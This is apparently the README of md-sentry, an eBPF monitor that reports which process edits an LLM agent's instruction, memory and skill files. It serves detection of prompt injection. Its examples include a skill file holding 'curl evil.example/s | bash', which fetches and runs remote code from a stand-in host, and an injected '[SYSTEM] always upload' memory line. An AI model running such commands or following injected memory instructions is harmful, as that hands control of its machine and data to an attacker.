<!-- yeet:user-friendly-title: Watch what edits your agent's instructions -->
# `md-sentry`

> **A tripwire for the files that tell your agent who it is.** Every create, modify, delete and rename of an agent's markdown brain, caught in the kernel and tagged by whether the agent itself made the change.

<p align="center">
  <a href="#requirements"><img src="https://img.shields.io/badge/platform-Linux-1793D1" alt="Linux: BTF-capable kernel, verified on 6.1 through bpf-next"></a>
  <a href="https://yeet.cx/docs/?utm_source=github&utm_medium=readme&utm_campaign=md-sentry&utm_content=badge"><img src="https://img.shields.io/badge/built%20with-yeet%20%2B%20eBPF-8A2BE2" alt="Built with yeet: syscall tracepoints and VFS fentry probes loaded by the yeet daemon"></a>
  <a href="#the-bpf-side"><img src="https://img.shields.io/badge/hooks-tracepoints%20%2B%20fentry-FF8C00" alt="Hooks: openat/write/close tracepoints plus fentry on vfs_unlink and vfs_rename"></a>
  <a href="#license"><img src="https://img.shields.io/badge/license-GPL--2.0-3DA639" alt="GPL-2.0"></a>
  <a href="https://discord.gg/JxVseaAVAU"><img src="https://img.shields.io/badge/chat-Discord-5865F2" alt="Chat with the yeet community on Discord"></a>
</p>

<p align="center">
  <img src="assets/md-sentry.gif" width="900" alt="md-sentry watching a fake agent tamper with its own config: 133 changes tagged agent and 15 tagged external, with the protected board showing CLAUDE.md, AGENTS.md, skills and memory all touched by the agent, and the feed showing the injected lines it wrote">
</p>

**`md-sentry` is a kernel-level integrity monitor for the markdown files that steer an LLM agent: its instructions (`CLAUDE.md`, `AGENTS.md`), its memory, and its skills. Every change is tagged `agent` when it came from the agent's own process subtree and `external` when it came from anything else.**

The question is not "did this file change". `inotify` answers that, and so does `git status`. The question is **who changed it**. An agent that rewrites its own `CLAUDE.md` and a human editing the same file in vim produce an identical write on disk; only the process tree tells them apart. md-sentry seeds the agent's subtree in the kernel and grows it through `fork`, so a tool the agent spawns three levels down is still attributed to the agent, and a change from outside that tree is not.

> [!TIP]
> **The `protected` board is the answer, the feed is the evidence.** The top panel is one row per protected glob with its most recent change. If every row reads `no changes` or `external`, the agent has left its own instructions alone, and that is the whole check, readable in a second. The feed below it exists for when the answer is "no" and you need to see exactly what happened.

## Questions this tool answers

**How do I tell whether my coding agent edited its own instruction files, or whether I did?**
Both produce the same write on disk, so a file watcher cannot separate them. md-sentry seeds the agent's process subtree in the kernel and grows it through `fork`, then tags every change `agent` or `external` by which side of that tree it came from. A tool the agent spawns three levels down still reads `agent`.

**Can I detect prompt injection that writes itself into an agent's memory or skill files?**
You can see the write as it lands, with the first line of the payload. md-sentry captures a bounded slice of the write buffer in the kernel, so a row shows not just that `.claude/skills/exfil.md` was created but the `curl evil.example/s | bash` that went into it. It reports rather than blocks, so treat it as detection, not a control.

**How do I monitor file integrity without running a scan or hashing a tree on a timer?**
Hook the change instead of polling for it. md-sentry attaches to the `openat`/`write`/`close` tracepoints and `fentry` on `vfs_unlink`/`vfs_rename`, so a change is reported at the instant the kernel performs it, with no periodic walk, no baseline database, and no hashing.

**Why can't inotify tell me which process modified a file?**
Because it is not in that business. `inotify` delivers filename and event type per watched directory; the caller is not part of the record, and you need a watch per directory with moves visible only at the watch root. The provenance has to come from somewhere that sees the calling task, which is what a kernel hook gives you.

**How do I audit what an AI agent is doing to a repository without installing an agent or a sidecar?**
Install the yeet daemon once and run a terminal program. Nothing is injected into the agent, no library is preloaded, and the processes being observed are not modified or cooperating. It works over SSH on a box where you cannot deploy anything.

**Can I get alerted when something rewrites a config file it should only be reading?**
Yes, for the markdown policy this tool covers. Mark the paths `protected` in `src/lib/policy.js` and pass `--channel <id>`; a protected file changed by the agent fires a Slack Block Kit alert with the actor, the operation and the payload preview, throttled per path so a loop does not spam the channel.

**Is this a replacement for auditd, Tripwire, or a file-integrity monitoring product?**
No. Those cover the whole filesystem, keep a baseline, retain records for compliance, and survive a reboot. md-sentry watches markdown on one host, keeps nothing after you quit, and cannot block anything. What it adds is per-change process attribution and the payload preview, which a FIM baseline does not carry. Use it alongside one, not instead.

**When should I use this instead of `git diff` or a pre-commit hook?**
Reach for this when the question is about a change you did not intend and would not review, or when the file is not in a repository at all: `~/.claude/` and agent memory usually are not. `git diff` is the right tool for changes you already expect to inspect, and it tells you nothing about which process wrote them or when.

## Contents

**Run it** — [Quick start](#quick-start) · [Flags](#flags) · [Trying it](#trying-it) · [Piping it somewhere](#piping-it-somewhere) · [Have an agent set it up](#have-an-agent-set-it-up)
**Understand it** — [A 60-second primer on eBPF and process provenance](#a-60-second-primer-on-ebpf-and-process-provenance) · [What you're looking at](#what-youre-looking-at) · [Controls](#controls) · [What it watches](#what-it-watches) · [How it works](#how-it-works)
**Reference** — [Requirements](#requirements) · [Honest caveats](#honest-caveats) · [Community questions](#community-questions)
**Contribute** — [Building from source](#building-from-source) · [Testing across kernels](#testing-across-kernels)

## Quick start

```sh
curl -fsSL https://yeet.cx | sh
yeet run github:yeet-src/md-sentry
```
[Manual install guide](https://yeet.cx/docs/installation) · Linux only

By default md-sentry looks for a running process whose command name contains `claude`. Pass `--agent` to target a different agent or a specific PID:

```sh
# match by command name (default)
yeet run github:yeet-src/md-sentry -- --agent claude

# seed from a specific PID
yeet run github:yeet-src/md-sentry -- --agent 12345

# alert a Slack channel when the agent touches a protected file
yeet run github:yeet-src/md-sentry -- --agent claude --channel C0123ABCD

```

The NDJSON companion emits one JSON object per change to stdout, for `jq` or a log pipeline. It is a second bundled entry in the same project:

```sh
yeet run github:yeet-src/md-sentry/src/dump.bundle.js -- --agent claude \
  | jq -c 'select(.protected and .agent)'
```

### Flags

**Live monitor (`src/main.jsx`)**

- **`--agent <pid|substring>`** (alias `-a`, default `claude`). A number seeds that PID's process subtree, which is the exact option: everything that forks from it is attributed to the agent, however deep. A string is matched two ways, and they do not have the same reach: the startup seed (and the 5-second reseed) scans the system graph and matches against **comm or argv[0]**, while the kernel's exec-time needle can only compare **comm**, which is capped at 15 characters. So prefer `--agent <pid>` when you know it.
- **`--channel <id>`** (alias `-c`) — Slack channel for protected-file alerts; alerting is off when unset.
- **`--alert-throttle <ms>`** (default `15000`) — minimum gap between Slack alerts for the same path.

Keys while it runs: `p` pauses the feed, `q` quits.

**JSON stream (`src/dump.bundle.js`)**

- **`--agent <pid|substring>`**, **`--channel <id>`** and **`--alert-throttle <ms>`** — same as above (the probe layer is shared).
- **`--secs <n>`** — stop after n seconds.
- **`--count <n>`** — stop after n records.

## Piping it somewhere

The TUI needs a real terminal. For a log pipeline, a file, or `jq`, use the NDJSON entry. Same probe, same policy, one JSON object per change on stdout:

```sh
# every protected change the agent made, as it happens
yeet run src/dump.bundle.js -- --agent claude | jq -c 'select(.protected and .agent)'

# a fixed window to a file
yeet run src/dump.bundle.js -- --agent 12345 --secs 60 > changes.ndjson

# the first 20 changes as a table
yeet run src/dump.bundle.js -- --count 20 | jq -r '[.op,.path,.comm,(.agent|tostring)]|@tsv'
```

Each record carries `wall`, `pid`, `ppid`, `uid`, `agent`, `op`, `comm`, `path`, `newPath`, `preview`, `nbytes`, `watched`, `protected`, `count` and a monotonic `seq`. Use `seq` rather than array position if you are resuming a stream: the in-memory log is capped and shifts from the front.

## Have an agent set it up

```
Set up md-sentry, a yeet script that shows every change to an LLM agent's markdown
instruction, memory and skill files, tagged by whether the agent itself made it.

1. git clone https://github.com/yeet-src/md-sentry && cd md-sentry
   (or: cd into an existing clone and `git pull`)
2. Read AGENTS.md for the runtime API and the gotcha list.
3. Run `make`. It fetches its own clang/bpftool/esbuild; no system toolchain needed.
4. Prove the probe works headlessly, before touching the TUI. In one shell:
     yeet run src/dump.bundle.js -- --agent $$ --secs 20
   In another, edit a watched file: `echo '- test' >> ~/CLAUDE.md`
   You should get one JSON object per change, with "agent":true.
5. Run the real thing:
     demo/sandbox.sh     (interactive: you drive the agent)
     demo/run.sh         (scripted: it drives itself)

Platform trap: Linux only, and it needs a BTF-capable kernel. On macOS use a Lima
VM; `make` on a Mac fails fast and tells you so.

Attribution trap: `--agent <string>` matches `comm`, which for a script started
via `#!/usr/bin/env bash` is "bash", not the script name. Pass a pid when you know
it; that path is exact.

"It compiled" is not the same as "it works". Step 4 is the one that proves the
probe attached and events are arriving.
```

Prefer to drive it yourself? [Quick start](#quick-start) is the two-line version.

## A 60-second primer on eBPF and process provenance

**eBPF** is a Linux kernel subsystem that lets a verified bytecode program run inside the kernel at specific hook points, with no kernel module required and no ability to crash the machine. The bytecode runs with bounded loops and no unbounded memory access; the kernel verifier rejects anything unsafe before it ever executes.

**Tracepoints** (`tp/`) are stable hook points the kernel exposes at well-known moments: when a syscall is entered or exited, when a process forks or execs, when it exits. They are the preferred hook for syscall observation because they survive kernel version changes.

**fentry** hooks attach to the entry of a specific kernel function. md-sentry uses them for `vfs_unlink` and `vfs_rename` because these operations bypass the `write` path entirely; there is no write syscall to intercept for a delete or a move.

**BTF** (BPF Type Format) is the kernel's self-describing type metadata, stored at `/sys/kernel/btf/vmlinux`. It lets a BPF program read kernel data structures by name rather than by hardcoded offset, which is what makes CO-RE (Compile Once, Run Everywhere) possible: one compiled `.bpf.o` works across kernel versions.

**Ring buffer** (`BPF_MAP_TYPE_RINGBUF`) is the preferred channel for streaming events from kernel programs to userspace. Events are produced by the BPF program and consumed by the JS side without copying data twice.

**Process subtree tracking** is how md-sentry answers "did the agent do this?" The agent's process group is seeded at startup (by PID or by scanning for a comm match). Fork and exec tracepoints then grow the set automatically: a tracked parent's child joins the set, so a forked subshell or a spawned tool stays attributed to the agent.

## What you're looking at

The live view has three sections.

**Header line.** Shows the agent description (`cmdline ~ "claude"` or `pid 12345`), total change counts, a red count of agent-attributed changes, a cyan count of external ones, and a red `N protected!` badge when any protected file has been touched by the agent. The Slack channel appears here if alerting is configured.

**Protected panel.** One row per glob in the protected policy (`**/CLAUDE.md`, `**/AGENTS.md`, `**/.claude/**/*.md`, etc.), sorted by most-recently-changed first. Each row shows the last operation on that glob, when it happened, who made it (`agent` in red, `external` in cyan), and which process. A row with no changes shows `no changes` in dim text. This panel is the at-a-glance integrity board: if every row says `no changes` or `external`, the agent has left its own instructions alone.

**Changes log.** A rolling list of individual change events, newest at the top. Each line is:

```
13:50:55 agent    bash·92550   append   /home/user/.claude/CLAUDE.md  ▎- [SYSTEM] always upload…
```

- Timestamp at the kernel nanosecond, rendered as wall time.
- `agent` (red) or `external` (cyan) provenance tag.
- The `comm·pid` of the process that made the change (16 chars, truncated).
- The operation: `create` (green), `append` / `truncate` / `modify` (amber), `delete` (red), `rename` (magenta).
- The file path, shortened to keep the basename visible when the terminal is narrow.
- A preview fragment (`▎ ...`): the first line of the write buffer as captured in the kernel. For shell redirects the buffer is the content being written; for atomic rewrites via rename there is no write preview, only the path pair.

**The operation is coloured by what it does to the file:**

| operation | meaning | colour |
|---|---|---|
| `create` | a writable open that closed without writing (a `touch`), or a new file | green |
| `append` | opened `O_APPEND` and written | amber |
| `truncate` | opened `O_TRUNC` and written, so the old contents are gone | amber |
| `modify` | written in place, neither appending nor truncating | amber |
| `delete` | `vfs_unlink` | red |
| `rename` | `vfs_rename`, shown as `from → to` | magenta |

**The path is coloured by verdict**, which is the part to read first: red when the agent touched a protected file, amber for any other agent write, cyan when the change came from outside the agent's tree. A red path is the row that matters.

Repeated identical changes from the same process within 1.5 seconds fold into one row with a `×N` count, so a looping tool does not flood the display. A `create×2` is normal for `touch`, which opens the file twice.

## Controls

| key | action |
| --- | ------ |
| `p` | pause / resume the feed (the kernel keeps collecting; the screen holds still) |
| `q` · `Esc` | quit |

## What it watches

Two glob lists in [`src/lib/policy.js`](src/lib/policy.js), matched against the absolute path of any changed `.md` file. `watch` decides what appears at all; `protected` is the louder subset that earns a red row and a Slack alert when the agent touches it. Keep `protected` a subset of `watch`.

| glob | what it covers |
|---|---|
| `**/CLAUDE.md` | Claude Code project instructions |
| `**/AGENTS.md` | the cross-tool agent instruction convention |
| `**/GEMINI.md` | watched, not protected |
| `**/.claude/**/*.md` | instructions, memory and skills under `~/.claude` |
| `**/MEMORY.md` | agent memory index |
| `**/memory/**/*.md` | memory notes |
| `**/skills/**/*.md`, `**/*.skill.md` | skill definitions |
| `**/commands/**/*.md` | slash-command prompts (watched, not protected) |
| `**/.hermes/**/*.md`, `**/.openclaw/**/*.md` | other agents' markdown state |

The globs are tail-anchored on purpose (`**/CLAUDE.md`, not an absolute path) so they match wherever an agent keeps its brain, and so a path reported relative to its mount still matches on the part that survives. `**` spans any number of directories, `*` any run within one, `?` a single character.

Editing the policy is the expected way to adapt this to an agent it does not know about. The globs are covered by [`test/lib.test.mjs`](test/lib.test.mjs), because getting one wrong is silent: the file simply stops being reported.

## How it works

### The BPF side

The BPF object attaches programs across these hook points:

| Hook | Program | What it captures |
|------|---------|-----------------|
| `tp/syscalls/sys_enter_openat` | `on_openat_enter` | Saves open flags for writable opens to the `pending_open` map |
| `tp/syscalls/sys_exit_openat` | `on_openat_exit` | On success: resolves the fd to a dentry, checks the `.md` suffix, registers in `watched` |
| `tp/syscalls/sys_enter_open` | `on_open_enter` | Same as `openat` enter, for the older `open` syscall (**x86 only**, see below) |
| `tp/syscalls/sys_exit_open` | `on_open_exit` | Same as `openat` exit (**x86 only**) |
| `tp/syscalls/sys_enter_dup2` | `on_dup2` | Copies the watch record to the new fd so shell redirects stay tracked (**x86 only**) |
| `tp/syscalls/sys_enter_dup3` | `on_dup3` | Same for `dup3` |
| `tp/syscalls/sys_enter_write` | `on_write` | On first write to a watched fd: emits the change event, captures up to 256 bytes of the write buffer as preview |
| `tp/syscalls/sys_enter_pwrite64` | `on_pwrite` | Same for positional writes |
| `tp/syscalls/sys_enter_close` | `on_close` | Emits a bare `create` for a writable open that never wrote (a `touch`); removes the fd from `watched` |
| `tp/sched/sched_process_exec` | `handle_exec` | Adds to `tracked` if the parent is tracked, the tgid is already tracked, or comm matches the configured needle |
| `tp/sched/sched_process_fork` | `handle_fork` | Adds a child to `tracked` if the parent is tracked |
| `tp/sched/sched_process_exit` | `handle_exit` | Removes the exited tgid from `tracked` |
| `fentry/vfs_unlink` | `on_unlink` | Emits `delete` for any `.md` dentry being unlinked |
| `fentry/vfs_rename` | `on_rename` | Emits `rename` when either the source or target dentry ends in `.md` |

BPF maps in use:

- `BPF_MAP_TYPE_RINGBUF` (`events`, 1 MB): event channel from kernel to userspace.
- `BPF_MAP_TYPE_HASH` (`tracked`): the agent's process subtree by tgid.
- `BPF_MAP_TYPE_HASH` (`pending_open`): in-flight writable opens, keyed by `pid_tgid`, bridging the enter and exit tracepoints.
- `BPF_MAP_TYPE_LRU_HASH` (`watched`): open writable file descriptors pointing at `.md` files, keyed by `tgid << 32 | fd`. LRU so a process that never closes a fd does not leak the table.

`open` and `dup2` are legacy syscalls that only some architectures provide. arm64 has `openat`/`dup3` and nothing else, so those tracepoints do not exist there, and the loader attaches every program an object contains, so the three are compiled out on non-x86 (`#ifdef HAVE_LEGACY_OPEN_DUP` in `src/bpf/probe.bpf.c`). Nothing is lost: on arm64 a program cannot call `open(2)` in the first place.

The kernel coarse-filters to file basenames ending in `.md`. Precise watch/protected globbing happens in JS.

### The JS side

Three layers, composed in the entry: `probes/` is the only code that touches
`yeet:bpf` and exposes plain signals, `components/` is pure UI that reads those
signals, and `lib/` is pure helpers with no kernel dependency at all, which is
what makes them testable without a VM.

| File | Role |
|------|------|
| `src/main.jsx` | Entry point. Owns view state and keyboard input, composes the components. This is what `yeet run .` runs. |
| `src/dump.js` | NDJSON entry. Reads the same probe signals and emits one JSON object per change to stdout, for `jq` or log pipelines. |
| `src/probes/probe.js` | Loads `bin/probe.bpf.o` and binds every map, once. Turns a load failure into a message that names what the program actually needs. |
| `src/probes/changes.js` | The change stream as signals: seeds the agent subtree, patches the comm needle into the `.bss` section, subscribes to the ring buffer, normalizes raw records, and publishes a snapshot on a timer. |
| `src/lib/policy.js` | Policy. The `watch` globs and the `protected` subset. Edit this to add or remove watched paths. |
| `src/lib/glob.js` | Glob → RegExp, and the labelled matchers the protected board is built from. |
| `src/lib/decode.js` | Decoders for the packed kernel bytes: the leaf-first path buffer, the `comm` string, the write preview. |
| `src/lib/model.js` | The change log as a pure model: coalescing, the running tallies, and the per-glob protected board. |
| `src/lib/scope.js` | Resolves `--agent` into a set of tgids by walking the system graph. |
| `src/lib/alert.js` | The Slack Block Kit alert, throttled per path. |
| `src/components/` | Pure UI: the title rail, the protected board, the change feed, the key-hint footer. |

### Data flow

The BPF ring buffer delivers a raw typed record (the `struct event` from `src/bpf/probe.bpf.c`) to `src/probes/changes.js`. It unpacks the leaf-first path component buffer by reversing and joining the path slots, renders the preview bytes as printable ASCII (non-printable bytes become `·`), matches the resulting path against the watch and protected globs in `src/lib/policy.js`, and folds the normalized change into the model. If the change is to a protected file and the agent made it, `maybeAlert` fires a Slack Block Kit message, throttled per path.

The UI is not driven per event. A busy agent fires many changes a second, and one repaint per event would be one per event too many, so the probe accumulates into the model (a plain object) and publishes a snapshot signal on a 400 ms window. One repaint per frame, regardless of the event rate.

## Requirements

> [!IMPORTANT]
> Linux with `CONFIG_DEBUG_INFO_BTF=y` (kernel BTF at `/sys/kernel/btf/vmlinux`). The `fentry/vfs_unlink` and `fentry/vfs_rename` programs require a kernel that exposes the modern `vfs_rename(struct renamedata *)` signature and has `fentry` support enabled, which is the case on most distributions shipping a recent kernel (Ubuntu 22.04+, Fedora 37+, Arch with a stock kernel).

- The yeet daemon, which loads the eBPF program. `curl -fsSL https://yeet.cx | sh` installs it.

## Honest caveats

> [!NOTE]
> md-sentry observes and reports. It cannot block a change. eBPF ring buffers are asynchronous; by the time an event arrives in userspace the write has already landed on disk. This is provenance and integrity visibility, not an enforcement boundary.

- **Observe only, not enforce.** An agent that appends a malicious instruction to `CLAUDE.md` will have already done so before md-sentry shows the red row. The tool tells you what happened; stopping it requires a different mechanism.
- **Async ring buffer race.** Under very high write rates, ring buffer records can be dropped if the consumer falls behind. A dropped event means a missed change, not a false "confirmed clean" state. The display does not currently show a drop counter.
- **Coarse `.md` filter.** The kernel side passes through every file whose basename ends in `.md`, regardless of directory. The precise policy is in [`src/lib/policy.js`](src/lib/policy.js), but any stray `.md` file anywhere on the system generates a kernel-side ring buffer reservation before JS drops it. On a busy system with many `.md` writes outside the agent directory, this is wasted overhead.
- **Path reconstructed from the mount root, not `/`.** The dentry parent walk stops at the mount boundary. A file on a bind-mount or a tmpfs has its path reported relative to that mount's root. The globs in [`src/lib/policy.js`](src/lib/policy.js) are tail-anchored (`**/CLAUDE.md`) to match regardless, but the displayed path can look shorter than the real absolute path.
- **No visibility into `mmap`-based writes.** A process that maps a file with `mmap` and writes through the mapping never calls `write` or `pwrite64`. md-sentry will not see those changes. This is a real gap for editors and runtimes that use memory-mapped I/O.
- **Slack delivery depends on the daemon's config.** The alert path is guarded and degrades silently when `yeet.alert` is unavailable or no channel is set, so verify end-to-end Slack delivery in your environment before relying on it.
- **Comm-match mode matches `comm`, which is not the script name you think it is.** A process started via `#!/usr/bin/env bash` has `comm=bash`, not `myagent.sh`; only a direct `#!/bin/bash` shebang gives the script's own name. `comm` is also truncated to 15 characters. The startup seed also checks `argv[0]`, so it is more forgiving, but the kernel's exec-time adoption path only ever sees `comm`. If attribution looks wrong, pass `--agent <pid>` instead of a name.
- **Subtree membership is best-effort at startup.** The initial seed queries the sysgraph for current processes. A process already running before md-sentry attached, whose parent has since exited, can be missed if the comm needle does not match it. The periodic reseed (in comm-match mode) closes most of this window.

## Community questions

**1. Can md-sentry stop the agent from changing a file?**
No. md-sentry is observe-and-alert only. eBPF ring buffer events are asynchronous, so the write has already landed by the time the change is reported. Enforcement needs a different mechanism.

**2. Does md-sentry modify any agent files or interfere with the agent's operation?**
No. The BPF programs are read-only observers. They place no locks, make no writes, and have no mechanism to pause or redirect the operations they observe. The agent runs exactly as it would without md-sentry attached.

**3. Why don't I see changes from a tool the agent spawned?**
The agent's process subtree is tracked by tgid. If the tool was already running before md-sentry started and its parent chain does not trace back to the seeded root, it will not be in the `tracked` set. In comm-match mode, the periodic reseed and the exec-time comm needle give it a second chance, but a long-lived pre-existing process can still be missed. Restart md-sentry after the agent session is fully up, or pass `--agent <pid>` with the agent's PID directly.

**4. Is it legal and appropriate to run this on a shared machine or in a CI environment?**
md-sentry watches every `.md` write on the machine that matches the policy globs, regardless of which user owns the file. On a machine where multiple users work, that includes other users' markdown files if they live at a matching path. Be aware of this on shared systems; on a single-user workstation or a dedicated CI runner it is not a concern.

**5. How is this different from inotify or `auditd` file watches?**
`inotify` delivers events per directory descriptor in userspace: it needs a watch for every directory, catches moves only at the watch root, and gives no caller context beyond the filename. `auditd` has per-event syscall overhead and produces structured records, but capturing the write-buffer preview is not built in. md-sentry does it all in one BPF object: open-flag classification, write-buffer capture, dentry path reconstruction, process subtree attribution, and Slack alerting, with a single ring buffer as the event channel. The tradeoff is that it needs a BTF-capable kernel and the yeet daemon; `inotify` works on any Linux kernel.

## Building from source

```sh
make              # BPF object + both JS bundles (what `yeet run` invokes for you)
make bpf          # just bin/probe.bpf.o
make bundle       # just the esbuild bundles
make veristat     # load the built object on THIS kernel and report verifier complexity
make clean        # remove every build artifact
node test/lib.test.mjs   # the pure-layer unit tests (no kernel needed)
```

**No system toolchain required.** `clang`, `bpftool`, `veristat` and `esbuild` are fetched as pinned static binaries into a shared per-machine cache (`~/.cache/yeet/toolchain/`), keyed by the version in `build/toolchain.lock` and checksum-verified. The first `make` downloads them; later builds reuse the cache. This is the same build frontend every current yeet script uses, which is what lets `yeet run github:yeet-src/md-sentry` build and run on a machine that has nothing installed but yeet.

BPF objects build on **Linux only**. macOS has no `bpftool` and no kernel BTF, so so `make` there fails fast and tells you to build in a Linux VM. `make bundle` still works anywhere.

Generated and gitignored: `bin/probe.bpf.o`, `src/bpf/include/vmlinux.h`, `src/index.jsx` and `src/dump.bundle.js` (the two bundles), and the `demo/agent-home/` fixture the demo creates.

## Trying it

Two demos. Both stand up a fake agent workspace under `demo/agent-home/` laid out like real agent config (`CLAUDE.md`, `AGENTS.md`, `.claude/skills`, `.claude/memory`), and both scope the monitor by **pid**, so attribution is exact rather than a comm guess.

**`demo/sandbox.sh` puts you in the agent's seat.** It splits a tmux window: md-sentry on top, and below it a shell that *is* the agent's process tree. Anything you type there is tagged `agent`; anything you do from a second terminal is tagged `external`. The shell greets you with a cheat sheet of things to try (an injected append, a dropped skill file, an atomic rewrite, a forked child, and one write the policy should ignore). This is the fastest way to feel what the tool actually distinguishes:

```sh
make && demo/sandbox.sh
```

**`demo/run.sh` runs itself.** A scripted agent tampers with its own config on a loop while a "human" edits the same file from outside its process tree, so you can watch the two get attributed differently without typing anything:

```sh
make && demo/run.sh
```

`test/traffic.sh` is the integration counterpart: it exercises the cases a simple append loop never reaches (atomic rewrite, deep nested paths, 30 rapid appends that must coalesce into one row, renames in and out of the policy, a bare `touch`, and two writes that must be dropped). Its header documents what a correct capture looks like for each.

## Testing across kernels

`.github/workflows/kernel-matrix.yml` runs the unit tests on every push, then builds the BPF object and confirms the verifier accepts every program across a range of kernels (6.1, 6.6, 6.12, `bpf-next`) booted under QEMU.

## License

The BPF program declares `char LICENSE[] SEC("license") = "GPL"`. This is the exact license string embedded in the object file; the GPL declaration is required because the program uses GPL-only kernel helpers.

---

Built with [yeet](https://yeet.cx/docs/?utm_source=github&utm_medium=readme&utm_campaign=md-sentry), a JS runtime for writing eBPF programs on Linux machines. Join us on [discord](https://discord.gg/JxVseaAVAU?utm_source=github&utm_medium=readme&utm_campaign=md-sentry).
